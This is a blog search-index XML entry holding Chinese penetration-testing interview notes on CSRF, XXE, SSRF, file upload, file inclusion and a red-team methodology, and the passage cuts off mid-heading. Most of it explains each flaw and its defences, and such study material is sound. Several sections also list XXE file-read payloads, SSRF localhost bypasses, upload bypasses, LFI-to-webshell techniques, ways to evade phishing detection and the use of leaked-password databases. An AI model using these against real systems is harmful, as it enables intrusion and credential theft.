<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>面试题2</title>
      <link href="/2022-09-25-%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/%E9%9D%A2%E8%AF%95+%E7%AC%94%E8%AF%95/%E9%9D%A2%E8%AF%95%E9%A2%982/"/>
      <url>/2022-09-25-%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/%E9%9D%A2%E8%AF%95+%E7%AC%94%E8%AF%95/%E9%9D%A2%E8%AF%95%E9%A2%982/</url>
      
        <content type="html"><![CDATA[<h1 id="CSRF"><a href="#CSRF" class="headerlink" title="CSRF"></a>CSRF</h1><p>跨站请求伪造 (Cross-Site Request Forgery, CSRF)。CSRF则通过伪装来自受信任用户的请求来利用受信任的网站。</p><blockquote><p><strong>条件：</strong>登录受信任网站A，并在本地生成Cookie。在不登出A的情况下，访问危险网站B。</p></blockquote><h3 id="CSRF特点"><a href="#CSRF特点" class="headerlink" title="CSRF特点"></a>CSRF特点</h3><blockquote><ul><li>攻击一般发起在第三方网站，而不是被攻击的网站。被攻击的网站无法防止攻击发生。</li><li>攻击利用受害者在被攻击网站的登录凭证，冒充受害者提交操作；而不是直接窃取数据。</li><li>整个过程攻击者并不能获取到受害者的登录凭证，仅仅是“冒用”。</li></ul></blockquote><h3 id="什么是同源策略"><a href="#什么是同源策略" class="headerlink" title="什么是同源策略"></a>什么是同源策略</h3><p>同源策略是浏览器的一个协议，浏览器规定，任意两个页面，当他们URL <strong>同域名 同协议 同端口</strong>才被称之为同源，同源页面可以相互读取页面资源和执行页面脚本，如果不是同源页面，就不被允许。</p><h3 id="跨域方式（非同源页面数据交互的方式）"><a href="#跨域方式（非同源页面数据交互的方式）" class="headerlink" title="跨域方式（非同源页面数据交互的方式）"></a>跨域方式（非同源页面数据交互的方式）</h3><blockquote><p>cors和jsonp</p></blockquote><ul><li>JSONP跨域</li></ul><blockquote><p>只支持GET请求，不支持POST等其它请求，也不支持复杂请求，只支持简单请求。</p><p>JSONP 是 JSON with padding（填充式 JSON 或参数式 JSON）的简写，它携带了json信息与回调函数名。JSONP实现跨域请求的原理简单的说，就是动态创建<script>标签，然后利用<script>的src 不受同源策略约束来跨域获取数据。利用<script>可以跨域的原理，而且在跨域脚本中可以直接回调当前脚本的函数</p><p>JSONP 由两部分组成：<strong>回调函数和数据</strong>。回调函数是当响应到来时应该在页面中调用的函数。回调函数的名字一般是在请求中指定的。而数据就是传入回调函数中的 JSON 数据。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">callback(&#123; &quot;username&quot;: &quot;cl4y&quot;, &quot;password&quot;: &quot;admin888&quot; &#125;)</span><br></pre></td></tr></table></figure></blockquote><ul><li>CORS跨域</li></ul><blockquote><p>支持所有的请求，包含GET、POST、OPTOIN、PUT、DELETE等。既支持复杂请求，也支持简单请求。</p><p>JSONP与CORS的使用目的相同，并且都需要服务端和客户端同时支持，但CORS的功能更加强大。</p><p>服务器设置Access-Control-Allow-Origin HTTP响应头之后，浏览器将会允许跨域请求</p></blockquote><ul><li>JSONP和CORS的优缺点</li></ul><blockquote><ol><li><p>JSONP的主要优势在于对浏览器的支持较好；虽然目前主流浏览器都支持CORS，但IE9及以下不支持CORS。</p></li><li><p>JSONP只能用于获取资源（即只读，类似于GET请求）；CORS支持所有类型的HTTP请求，功能完善。</p></li></ol></blockquote><h3 id="csrf-如何不带-referer-访问"><a href="#csrf-如何不带-referer-访问" class="headerlink" title="csrf 如何不带 referer 访问"></a>csrf 如何不带 referer 访问</h3><blockquote><ul><li>通过地址栏，⼿动输⼊；</li><li>从书签⾥⾯选择；</li><li>通过实现设定好的⼿势。</li></ul><p>上⾯说的这三种都是⽤户⾃⼰去操作，因此不算 CSRF。</p><ul><li>跨协议间提交请求</li></ul><p>常⻅的协议：ftp://,http://,https://,fifile://,javascript:,data:. 最简单的情况就是我们在本地打开⼀个 HTML ⻚⾯ 这个时候浏览器地址栏是file:// 开头的 如果这个 HTML ⻚⾯向任何 http 站点提交请求的话 这些请求 HTML ⻚⾯，Referer 都是空的。那么我们接下来可以利⽤ data: 协议来构造⼀个⾃动提交的 CSRF 攻击。当然这个协议是 IE 不⽀持的，我们可以换⽤ javascript</p></blockquote><h3 id="token-和-referer-做横向对⽐，谁安全等级⾼？"><a href="#token-和-referer-做横向对⽐，谁安全等级⾼？" class="headerlink" title="token 和 referer 做横向对⽐，谁安全等级⾼？"></a>token 和 referer 做横向对⽐，谁安全等级⾼？</h3><blockquote><p>token 安全等级更⾼，因为并不是任何服务器都可以取得 referer，如果从 HTTPS 跳到HTTP，也不会发送 referer。并且 FLASH ⼀些版本中可以⾃定义 referer。但是 token 的话，要保证其⾜够随机且不可泄露。(不可预测性原则)</p></blockquote><h3 id="CSRF-有何危害？"><a href="#CSRF-有何危害？" class="headerlink" title="CSRF 有何危害？"></a>CSRF 有何危害？</h3><blockquote><ul><li>篡改⽬标⽹站上的⽤户数据</li><li>盗取⽤户隐私数据 </li><li>传播 CSRF 蠕虫</li><li>盗取身份发送邮件、消息、空间说说</li><li>盗取身份进行虚拟货币转账</li></ul></blockquote><h3 id="防御CSRF"><a href="#防御CSRF" class="headerlink" title="防御CSRF:"></a>防御CSRF:</h3><p>主要是两种方式：<strong>阻止外域访问</strong>和<strong>提交时要求附加本域才能获取的信息</strong></p><ul><li>阻止不明外域的访问</li></ul><blockquote><ul><li>验证 HTTP Referer 字段,阻止不明外域的访问,进行同源检测</li><li>设置Samesite CookieStrict</li></ul></blockquote><ul><li>提交时要求附加本域才能获取的信息</li></ul><blockquote><ul><li><strong>CSRFToken</strong>设置随机 Token</li></ul><p>前面讲到CSRF的另一个特征是，攻击者无法直接窃取到用户的信息（Cookie，Header，网站内容等），仅仅是冒用Cookie中的信息。那么我们可以要求所有的用户请求都携带一个CSRF攻击者无法获取到的Token。服务器通过校验请求是否携带正确的Token，来把正常的请求和攻击的请求区分开，也可以防范CSRF的攻击。</p><p>所以CSRFToken不能通过cookie的形式接收、发送：</p><ul><li><ul><li>设置csrftoken的http头发送</li><li>利用post/get形式发送</li></ul></li><li><p><strong>设置验证码</strong></p></li><li><p><strong>双重Cookie验证</strong></p></li></ul><p></p><p>双重cookie验证:也可以利用CSRF攻击不能获取到用户Cookie的特点，我们可以要求Ajax和表单请求携带一个Cookie中的值。</p><blockquote><ul><li>在用户访问网站页面时，通过set-cookie获取一个csrftoken例如：csrfcookie=v8g9e4ksfhw</li><li>在每次发起请求时，取出Cookie，并添加到URL的参数中例如：<a href="https://www.a.com/comment?csrfcookie=v8g9e4ksfhw%E3%80%82">https://www.a.com/comment?csrfcookie=v8g9e4ksfhw。</a></li><li>后端接口验证Cookie中的csrfcookie值与URL参数中的值是否一致，不一致则拒绝。</li></ul></blockquote></blockquote><h1 id="XXE"><a href="#XXE" class="headerlink" title="XXE"></a>XXE</h1><h3 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h3><blockquote><p>XXE漏洞是在对外部实体数据进行处理时引发的安全问题</p><p>XXE漏洞发生在应用程序解析XML输入时，没有禁止外部实体的加载，导致可加载恶意外部文件和代码，造成任意文件读取、命令执行、SSRF、发起Dos攻击等危害。</p></blockquote><h3 id="触发点"><a href="#触发点" class="headerlink" title="触发点"></a>触发点</h3><blockquote><p>往往是可以上传、读取xml,json数据的位置，没有对xml文档内容进行过滤，导致可上传、读取恶意xml数据。</p></blockquote><h3 id="利用方式"><a href="#利用方式" class="headerlink" title="利用方式"></a>利用方式</h3><ul><li>文件读取</li></ul><blockquote><p>利用file://协议payload</p></blockquote><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xmlversion=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span>?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPEnote [</span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITYfile <span class="keyword">SYSTEM</span> <span class="string">&quot;file:///F:/1.txt&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">note</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">heading</span>&gt;</span><span class="symbol">&amp;file;</span><span class="tag">&lt;/<span class="name">heading</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">note</span>&gt;</span></span><br></pre></td></tr></table></figure><ul><li>命令执行</li></ul><p></p><blockquote><p>命令执行<a href="https://www.php.net/manual/zh/wrappers.expect.php">https://www.php.net/manual/zh/wrappers.expect.php</a><br>php的expect:// 协议可以用来执行命令，也是一个伪协议<br>为了使用 expect:// 封装器，必须安装 » PECL 上的 » Expect 扩展。不安装扩展是没有办法使用的<br>expect://command</p></blockquote><ul><li>SSRF</li></ul><blockquote><p>通过回显时间、回显长度判断端口是否开放,</p><p>如果直接回显 （burp抓包重发），则表明存在端口服务</p></blockquote><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xmlversion=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span>?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPEnote [</span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITYxxeSYSTEM <span class="string">&quot;http://10.211.55.5:80&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">note</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">info</span>&gt;</span><span class="symbol">&amp;xxe;</span><span class="tag">&lt;/<span class="name">info</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">note</span>&gt;</span></span><br></pre></td></tr></table></figure><ul><li>DOS拒绝服务攻击</li></ul><h3 id="xxe防御"><a href="#xxe防御" class="headerlink" title="xxe防御"></a>xxe防御</h3><blockquote><ul><li>通过黑名单过滤用户提交的XML数据</li><li>配置XML处理器使用禁用DTD、禁止外部实体解析</li></ul></blockquote><h1 id="SSRF"><a href="#SSRF" class="headerlink" title="SSRF"></a>SSRF</h1><h3 id="SSRF漏洞可以使用的协议"><a href="#SSRF漏洞可以使用的协议" class="headerlink" title="SSRF漏洞可以使用的协议"></a>SSRF漏洞可以使用的协议</h3><blockquote><ul><li>http</li><li>file</li></ul><blockquote><p>在有回显的情况下，利用 file 协议可以读取任意文件的内容</p></blockquote><ul><li>dict</li></ul><blockquote><p>泄露安装软件版本信息，查看端口，操作内网redis服务等</p></blockquote><ul><li>gophar</li></ul><blockquote><p>gopher支持发出GET、POST请求。可以先截获get请求包和post请求包，再构造成符合gopher协议的请求。gopher协议是ssrf利用中一个最强大的协议(俗称万能协议)。可用于反弹shell</p></blockquote></blockquote><h3 id="SSRF-漏洞的成因"><a href="#SSRF-漏洞的成因" class="headerlink" title="SSRF 漏洞的成因"></a>SSRF 漏洞的成因</h3><blockquote><p>漏洞形成的原因大多是因为服务端提供，从其他服务器应用获取数据的功能且没有对目标地址作过滤和限制。而且在大部分的web架构中服务器自身是可以访问互联网服务和所在内网资源，此时攻击者就可以传入任意地址（内网地址）来让服务器发起请求，并返回数据，进而造成SSRF攻击。</p></blockquote><h3 id="SSRF-漏洞的验证⽅法："><a href="#SSRF-漏洞的验证⽅法：" class="headerlink" title="SSRF 漏洞的验证⽅法："></a>SSRF 漏洞的验证⽅法：</h3><blockquote><p>1）因为 SSRF 漏洞是让服务器发送请求的安全漏洞，所以我们就可以通过抓包分析发送的请求是否是由服务器的发送的，从⽽来判断是否存在 SSRF 漏洞</p><p>2 ） 在 ⻚ ⾯ 源 码 中 查 找 访 问 的 资 源 地 址  ， 如 果 该 资 源 地 址 类 型 为<a href="http://www.baidu.com/xxx.php?image=%EF%BC%88%E5%9C%B0%E5%9D%80%EF%BC%89%E7%9A%84%E5%B0%B1%E5%8F%AF%E8%83%BD%E5%AD%98%E5%9C%A8">www.baidu.com/xxx.php?image=（地址）的就可能存在</a> SSRF 漏洞</p></blockquote><h3 id="SSRF利用方式"><a href="#SSRF利用方式" class="headerlink" title="SSRF利用方式"></a>SSRF利用方式</h3><blockquote><ul><li>扫描内网ip、端口，探测主机端口存活，获取banner信息。</li><li>攻击运行本地运行的应用程序</li><li>攻击内网服务（mysql、redis）</li><li>攻击内网web服务</li><li>利用file协议读取本地文件</li></ul></blockquote><h3 id="SSRF-漏洞防御"><a href="#SSRF-漏洞防御" class="headerlink" title="SSRF 漏洞防御"></a>SSRF 漏洞防御</h3><blockquote><p>禁止跳转，限制协议，内外⽹限制、URL 限制 针对 IP 格式</p><ul><li>设置IP白名单</li><li>限制请求的端口</li><li>禁止不常用的协议</li><li>过滤返回的信息</li><li>统一错误信息</li></ul><blockquote><p>避免用户可以根据错误信息来判断远程服务器的端口状态。</p></blockquote><ul><li>对DNS Rebinding，可以使用Host白名单的方式，如果域名不可控，可以使用沙箱实现内网分离</li></ul></blockquote><h3 id="SSRF漏洞出现位置"><a href="#SSRF漏洞出现位置" class="headerlink" title="SSRF漏洞出现位置"></a>SSRF漏洞出现位置</h3><blockquote><ul><li>社交分享功能：获取超链接的标题等内容进行显示。在分享内容的时候，可能需要先把内容请求显示一个预览给用户看，这个时候自动进行了请求的时候可能就存在SSRF</li><li>转码服务：通过URL地址把原地址的网页内容调优使其适合手机屏幕浏览</li><li>在线翻译：给网址翻译对应网页的内容</li><li>图片文章加载/下载/收藏：例如富文本编辑器中的点击下载图片到本地、通过URL地址加载或下载图片</li><li>云服务厂商：它会远程执行一些命令来判断网站是否存活等，所以如果可以捕获相应的信息，就可以进行ssrf测试邮件系统：比如接收邮件服务器地址，再比如多地ping提供的服务。</li></ul></blockquote><h3 id="csrf跟ssrf区别"><a href="#csrf跟ssrf区别" class="headerlink" title="csrf跟ssrf区别"></a>csrf跟ssrf区别</h3><blockquote><ul><li>CSRF (Cross-site request forgery)跨站请求伪造</li><li>SSRF (Server-Side Request Forgery)服务器端请求伪造</li><li>csrf 一个是客户端发起，ssrf是从服务端发起的</li></ul></blockquote><h3 id="SSRF-禁用-127-0-0-1-后如何绕过，支持哪些协议？"><a href="#SSRF-禁用-127-0-0-1-后如何绕过，支持哪些协议？" class="headerlink" title="SSRF 禁用 127.0.0.1 后如何绕过，支持哪些协议？"></a>SSRF 禁用 127.0.0.1 后如何绕过，支持哪些协议？</h3><blockquote><ul><li>利用进制转换</li><li>利用 DNS 解析</li><li>利用句号（127。0。0。1）</li><li>利用[::]（http://[::]:80/）；</li><li>利用@（<a href="http://example.com@127.0.0.1);/">http://example.com@127.0.0.1）；</a></li><li>利用短地址（百度短网址）；</li></ul></blockquote><blockquote><p>协议：（Dict://、SFTP://、TFTP://、LDAP://、Gopher://）</p></blockquote><h1 id="文件上传"><a href="#文件上传" class="headerlink" title="文件上传"></a>文件上传</h1><h3 id="文件上传的攻击特征是什么"><a href="#文件上传的攻击特征是什么" class="headerlink" title="文件上传的攻击特征是什么"></a>文件上传的攻击特征是什么</h3><blockquote><p>文件上传首先是POST的数据包，且content-type为multipart/form-data，如果为恶意的文件上传漏洞攻击，则数据包中filename属性的后缀为jsp,php,asp等恶意后缀，且文件内容一般为Webshell内容</p></blockquote><h3 id="⽂件上传漏洞原理"><a href="#⽂件上传漏洞原理" class="headerlink" title="⽂件上传漏洞原理"></a>⽂件上传漏洞原理</h3><blockquote><p>由于程序员在对⽤户⽂件上传部分的控制不⾜或者处理缺陷，⽽导致⽤户可以越过其本身权限向服务器上传可执⾏的动态脚本⽂件，通过上传⽂件可达到控制网站权限的目的。</p></blockquote><h3 id="文件上传产生漏洞的原因"><a href="#文件上传产生漏洞的原因" class="headerlink" title="文件上传产生漏洞的原因"></a>文件上传产生漏洞的原因</h3><blockquote><ul><li>服务器配置不当</li><li>文件上传限制被绕过</li><li>开源编辑器的上传漏洞</li><li>文件解析漏洞导致文件执行</li><li>过滤不严或被绕过</li></ul></blockquote><h3 id="利用条件"><a href="#利用条件" class="headerlink" title="利用条件"></a>利用条件</h3><blockquote><ul><li>有上传功能</li><li>知道文件上传后的路径</li><li>上传后的文件可以访问</li><li>上传后的文件可以执行</li></ul></blockquote><h3 id="文件上传检测"><a href="#文件上传检测" class="headerlink" title="文件上传检测"></a>文件上传检测</h3><blockquote><p>**客户端javascript校验:**校验文件后缀名</p><p><strong>服务端校验</strong></p><ul><li><blockquote><ul><li><ul><li>MIME检测（content-type头检测）</li><li>文件内容检测</li></ul></li><li><ul><li><blockquote><ul><li>文件幻数检测</li><li>PHP脚本标签</li><li>危险函数</li></ul></blockquote></li></ul></li><li><ul><li>后缀名检测</li></ul></li><li><ul><li><blockquote><ul><li>黑名单</li><li>白名单</li></ul></blockquote></li></ul></li><li><ul><li>图片渲染</li><li>图片裁剪</li></ul></li></ul></blockquote></li></ul></blockquote><h3 id="常⻅的上传绕过⽅式"><a href="#常⻅的上传绕过⽅式" class="headerlink" title="常⻅的上传绕过⽅式"></a>常⻅的上传绕过⽅式</h3><blockquote><ul><li>前端 js 验证：禁⽤ js/burp 改包</li><li>⼤⼩写</li><li>双重后缀名</li><li>过滤绕过 pphphp->php</li></ul></blockquote><h3 id="文件上传防御"><a href="#文件上传防御" class="headerlink" title="文件上传防御"></a>文件上传防御</h3><blockquote><p><strong>1. 文件上传的目录设置为不可执行</strong></p><p>只要web容器无法解析该目录下面的文件，即使攻击者上传了脚本文件，服务器本身也不会受到影响，这一点至关重要。</p><p><strong>2. 判断文件类型</strong></p><p>在判断文件类型时，可以结合使用MIME-Type、后缀检查等方式。在文件类型检查中，强烈推荐白名单方式，黑名单的方式已经无数次被证明是不可靠的。此外，对于图片的处理，可以使用压缩函数或者resize函数，在处理图片的同时破坏图片中可能包含的HTML代码。</p><p><strong>3. 使用随机数改写文件名和文件路径</strong></p><p>文件上传如果要执行代码，则需要用户能够访问到这个文件。在某些环境中，用户能上传，但不能访问。如果应用了随机数改写了文件名和路径，将极大地增加攻击的成本。再来就是像shell.php.rar.rar和crossdomain.xml这种文件，都将因为重命名而无法攻击。</p><p><strong>4. 单独设置文件服务器的域名</strong></p><p>由于浏览器同源策略的关系，一系列客户端攻击将失效，比如上传crossdomain.xml、上传包含Javascript的XSS利用等问题将得到解决。</p></blockquote><h3 id="其他小问题"><a href="#其他小问题" class="headerlink" title="其他小问题"></a>其他小问题</h3><ol><li>审查上传点的元素有什么意义？</li></ol><blockquote><p>有些站点的上传⽂件类型的限制是在前端实现的，这时只要增加上传类型就能突破限制了。</p></blockquote><ol start="2"><li>Webshell是什么，原理是什么</li></ol><blockquote><p>WebShell就是一句话木马，由于脚本语言的动态性，木马文件通过命令执行system函数或者代码执行eval函数等，参数为用户外部传入（如GET传参，POST传参）达到执行任意代码任意命令的功能。从而远程控制目标主机。</p></blockquote><h1 id="任意文件读取-删除"><a href="#任意文件读取-删除" class="headerlink" title="任意文件读取/删除"></a>任意文件读取/删除</h1><h3 id="漏洞描述"><a href="#漏洞描述" class="headerlink" title="漏洞描述"></a>漏洞描述</h3><blockquote><p>很多网站由于业务需求，往往需要提供文件下载、读取、删除等功能块，但是如果对下载的文件没有做限制，直接通过绝对路径、相对路径对其文件进行读取，那么，用户就可以利用这种方式读取服务器的敏感文件、获取网站源代码、进行SSRF漏洞攻击。</p></blockquote><h3 id="产生原因"><a href="#产生原因" class="headerlink" title="产生原因"></a>产生原因</h3><blockquote><ul><li>存读取文件的函数</li><li>读取文件的路径用户可控，且未校验或校验不严</li><li>输出了文件内容</li></ul></blockquote><h3 id="文件读取函数"><a href="#文件读取函数" class="headerlink" title="文件读取函数"></a>文件读取函数</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">show_source</span>()高亮显示文件内容</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>()高亮显示文件内容(别名)</span><br><span class="line"><span class="title function_ invoke__">readfile</span>()读取文件内容并输出</span><br><span class="line"><span class="title function_ invoke__">file_get_contents</span>()将文件读取为字符串</span><br><span class="line"><span class="title function_ invoke__">file</span>()将文件安行读取为数组</span><br></pre></td></tr></table></figure><h3 id="漏洞产生位置"><a href="#漏洞产生位置" class="headerlink" title="漏洞产生位置"></a>漏洞产生位置</h3><blockquote><ul><li>读取/下载图片、文件内容；</li><li>下载附件；</li><li>预览文档；</li><li>导出文档；</li><li>修改、保存文档等</li><li>删除文件、附件、图片、替换、配置等</li></ul></blockquote><h1 id="文件包含"><a href="#文件包含" class="headerlink" title="文件包含"></a>文件包含</h1><blockquote><p>服务器执行PHP文件时，可以通过文件包含函数加载另一个文件中的内容，将之当成PHP脚本来执行。而由于包含的文件名没有经过合理的校验和过滤，从而包含了预想之外的文件，导致意外的文件泄露甚至恶意的代码注入，导致了执行了非预期的代码。主要包括本地文件包含和远程文件包含两种形式。</p></blockquote><h3 id="php-的LFI（本地包含漏洞）原理是什么？"><a href="#php-的LFI（本地包含漏洞）原理是什么？" class="headerlink" title="php 的LFI（本地包含漏洞）原理是什么？"></a>php 的LFI（本地包含漏洞）原理是什么？</h3><blockquote><p>文件包含产生原因：</p><blockquote><ul><li>存读取文件的函数</li><li>读取文件的路径用户可控，且未校验或校验不严</li><li>输出了文件内容</li></ul></blockquote></blockquote><h3 id="本地文件包含利用方式"><a href="#本地文件包含利用方式" class="headerlink" title="本地文件包含利用方式"></a>本地文件包含利用方式</h3><blockquote><ol><li>包含本地文件，读取敏感文件，如host，password文件</li><li>先将shell写入日志，然后再包含日志文件getshell。<br>如果是浏览器url写入日志php代码，会被浏览器注释掉，可以通过burp发包或者是curl发包访问服务器日志<br>也可以写在UA头中，日志文件也会显示UA头</li><li>将shell写入session文件，包含session文件getshell。SESSION 文件保存的目录由session.save_path指定，文件名以 sess_ 为前缀，后跟 SESSION ID，如：sess_c72665af28a8b14c0fe11afe3b59b51b。文件中的数据即是序列化之后的SESSION数据了</li><li>结合PHP伪协议getshell</li></ol><blockquote><ul><li><p>file://用于访问本地文件系统</p></li><li><p>php://访问各个输入/输出流（I/O streams）</p></li><li><p>php://filter是一种元封装器，可以在读取文件之前对文件编码、转换、压缩、加密等</p></li><li><p>php://input是个可以访问请求的原始数据的只读流,可以读取到post没有解析的原始数据。会读取POST内容里面的代码来执行</p><blockquote><p><a href="https://www.php.cn/php-ercikaifa-346258.html">https://www.php.cn/php-ercikaifa-346258.html</a></p></blockquote></li><li><p>data://data伪协议是一个数据流封装器，可以理解为把数据当作一个文件共享</p></li><li><p>http:// https://允许通过 HTTP 1.0 的 GET方法，以只读访问文件或资源。</p></li><li><p>phar://可以访问zip、phar格式包内容</p></li></ul></blockquote><ol start="5"><li>结合文件上传getshell。如上传txt或者jpg等，在文件末尾加入一句话。结合文件包含漏洞，即可解析代码。图片马</li><li>远程文件包含getshell，写在VPS上。需要开启allow_url_include设置为ON</li></ol></blockquote><h3 id="导致⽂件包含的函数"><a href="#导致⽂件包含的函数" class="headerlink" title="导致⽂件包含的函数"></a>导致⽂件包含的函数</h3><blockquote><ul><li><code>PHP：include(), include_once(), require(), re-quire_once(), fopen(), readfifile(), …</code> </li><li><code>JSP/Servlet：ava.io.File(),java.io.Fil-eReader(), …</code> </li><li><code>ASP：include fifile, include virtual,</code></li></ul></blockquote><h3 id="PHP中文件包含函数特点："><a href="#PHP中文件包含函数特点：" class="headerlink" title="PHP中文件包含函数特点："></a>PHP中文件包含函数特点：</h3><blockquote><p>文件包含不需要考虑文件名是否为php.。包含的文件当中，存在符合php语法的内容，则执行这些内容。，意思就是<strong>即使后缀不是php，也会执行php</strong></p><p>包含的文件当中，不存在符合php语法的内容，则原封不动的输出这些内容</p><p>这样我们就可以窃取主机上的内容</p></blockquote><h3 id="文件包含防御"><a href="#文件包含防御" class="headerlink" title="文件包含防御"></a>文件包含防御</h3><blockquote><ul><li><strong>配置文件：</strong></li></ul><p>在配置文件中限制访问的文件目录，比如PHP中php.ini配置open_basedir</p><p>尽量关闭allow_url_include配置</p><ul><li><strong>特殊字符过滤：</strong></li></ul><p>检查用户输入，过滤或转义含有“../”、“..\”、“http”、“%00”，“..”，“.”，“#”等跳转目录或字符终止符、截断字符、url的输入</p><ul><li><strong>合法性判断：</strong></li></ul><p>严格过滤用户输入字符的合法性，比如文件类型、文件地址、文件内容等</p><ul><li><strong>白名单：</strong></li></ul><p>白名单限定访问文件的路径、名称及后缀名</p><ul><li><strong>控制回显：</strong></li></ul></blockquote><h1 id="红队"><a href="#红队" class="headerlink" title="红队"></a>红队</h1><h3 id="在外网打点过程中，常用的信息收集工具有哪些？"><a href="#在外网打点过程中，常用的信息收集工具有哪些？" class="headerlink" title="在外网打点过程中，常用的信息收集工具有哪些？"></a>在外网打点过程中，常用的信息收集工具有哪些？</h3><blockquote><ul><li>ENScan 企业信息查询工具 </li><li>Oneforall 子域名收集工具 </li><li>水泽 信息收集自动化工具 </li><li>FOFA、Goby 网络空间资产检索\攻击面测绘工具 </li><li>Masscan 端口扫描工具 </li><li>ARL 资产安全灯塔 快速侦察与目标关联的资产工具</li><li>Nmap 端口扫描工具</li><li>Awvs 自动化的Web应用程序安全测试工具</li></ul></blockquote><h3 id="钓鱼邮件如何绕过安全设备的检测"><a href="#钓鱼邮件如何绕过安全设备的检测" class="headerlink" title="钓鱼邮件如何绕过安全设备的检测"></a>钓鱼邮件如何绕过安全设备的检测</h3><blockquote><p>去特征，从免杀的角度无非就是几种方法：花指令，杀软对抗，加壳免杀，编码免杀。发送邮件的邮件系统最好有 PTR 反向解析（可以减少邮件不被信任/进垃圾箱的几率）。也可以使用 word 文档，excle 的宏等。</p></blockquote><h3 id="如果给你⼀个网站-你的渗透测试思路是什么-在获取书面授权的前提下。"><a href="#如果给你⼀个网站-你的渗透测试思路是什么-在获取书面授权的前提下。" class="headerlink" title="如果给你⼀个网站, 你的渗透测试思路是什么? 在获取书面授权的前提下。"></a>如果给你⼀个网站, 你的渗透测试思路是什么? 在获取书面授权的前提下。</h3><blockquote><p><a href="https://blog.csdn.net/qq_36119192/article/details/84674109">https://blog.csdn.net/qq_36119192/article/details/84674109</a></p></blockquote><h4 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h4><blockquote><ul><li>a、服务器的相关信息（真实 ip，系统类型，版本，开放端⼝，WAF 等）。看看是否存在已知的漏洞，⽐如 IIS，APACHE,NGINX 的解析漏洞。</li></ul><blockquote><p>对 IP 地址端⼝扫描，对响应的端⼝进⾏漏洞探测，⽐如 rsync, ⼼脏出⾎，mysql,ftp,ssh 弱⼝令等。</p></blockquote><ul><li>b、⽹站指纹识别（包括，cms，cdn，证书等），dns 记录</li><li>c、获取域名的whois 信息，姓名，备案，邮箱，电话反查（邮箱丢社⼯库，社⼯准备等）</li></ul><blockquote><p>丢社⼯库⾥看看有没有泄露密码，然后尝试⽤泄露的密码进⾏登录后台。⽤邮箱做关键词进⾏丢进搜索引擎。利⽤搜索到的关联信息找出其他邮箱进⽽得到常⽤社交账号。社⼯找出社交账号，⾥⾯或许会找出管理员设置密码的习惯 。利⽤已有信息⽣成专⽤字典。</p></blockquote><ul><li>e、⼦域名收集，旁站，C 段等。因为主站⼀般⽐较难，所以先看看旁站有没有通⽤的 cms 或者其他漏洞。</li><li>f、google hacking 针对化搜索，pdf ⽂件，中间件版本，弱⼝令扫描等。进⼀步探测⽹站的信息，后台，敏感⽂件等</li><li>g、扫描⽹站⽬录结构，爆后台，⽹站 banner，测试⽂件，备份等敏感⽂件泄漏等</li><li>h、传输协议，通⽤漏洞，exp，github 源码等</li></ul></blockquote><h4 id="漏洞挖掘-扫描、验证与利用"><a href="#漏洞挖掘-扫描、验证与利用" class="headerlink" title="漏洞挖掘/扫描、验证与利用"></a>漏洞挖掘/扫描、验证与利用</h4><blockquote><p>有授权情况下可以根据情况进行漏洞扫描</p></blockquote><blockquote><ul><li>a、浏览⽹站，看看⽹站规模，功能，特点等</li><li>b、端⼝，弱⼝令，⽬录等扫描, 对响应的端⼝进⾏漏洞探测，⽐如 rsync, ⼼脏出⾎，mysql，ftp，ssh 弱⼝令等</li><li>c、XSS、SQL 注⼊、代码执行、命令执行、SSRF、CSRF、cookie 安全检测、敏感信息、暴⼒破解、任意⽂件上传、越权访问、未授权访问、⽬录遍历、⽂件 包含、重放攻击（短信轰炸）等服务器漏洞的检测</li><li>d、最后使⽤漏扫⼯具AWVS、xray、AppScan、Nessus等</li></ul></blockquote><blockquote><p>利用：通过漏洞拿下webshell或者是其他权限</p></blockquote><h4 id="权限提升"><a href="#权限提升" class="headerlink" title="权限提升"></a>权限提升</h4><blockquote><p>获得了webshell后，一般权限很低，所以我们需要提权，可以选择<strong>反弹一个MSF类型的shell提权</strong>：Metasploit Framework(MSF)的使用  、 Msfvenonm生成一个后门木马，也可以反弹一个CobaltStrike类型的shell：渗透测试神器Cobalt Strike的使用， 也可以MSF和CobaltStrike联动：MSF和CobaltStrike联动 也可以使用其他提权：Windows提权 、 Linux提权</p></blockquote><blockquote><p>a、mysql 提权 serv u 提权 oracle 提权 udf提权<br>b、windows 溢出提权、windows低版本的漏洞，如 iis6,pr, 巴⻄烤⾁<br>c、linux 脏⽜, 内核漏洞提权 </p></blockquote><h4 id="内网渗透"><a href="#内网渗透" class="headerlink" title="内网渗透"></a>内网渗透</h4><blockquote><ol><li>内网信息收集</li><li>内网转发，搭建socks5代理</li><li>内网横向渗透</li><li>权限维持</li></ol></blockquote><h4 id="痕迹清除、清除测试数据-输出报告"><a href="#痕迹清除、清除测试数据-输出报告" class="headerlink" title="痕迹清除、清除测试数据 & 输出报告"></a>痕迹清除、清除测试数据 & 